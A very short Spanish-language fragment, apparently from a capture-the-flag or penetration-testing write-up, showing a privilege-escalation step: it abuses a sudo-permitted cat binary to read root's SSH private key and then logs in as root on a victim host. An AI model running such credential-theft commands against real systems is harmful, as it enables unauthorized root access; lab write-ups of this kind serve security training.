Aprovechamos el binario para robar clave ssh de root:

```bash
sudo -u USER /bin/cat /root/.ssh/id_rsa
chmod 600 id_rsa

ssh -i id_rsa root@IP_VICTIMA
```
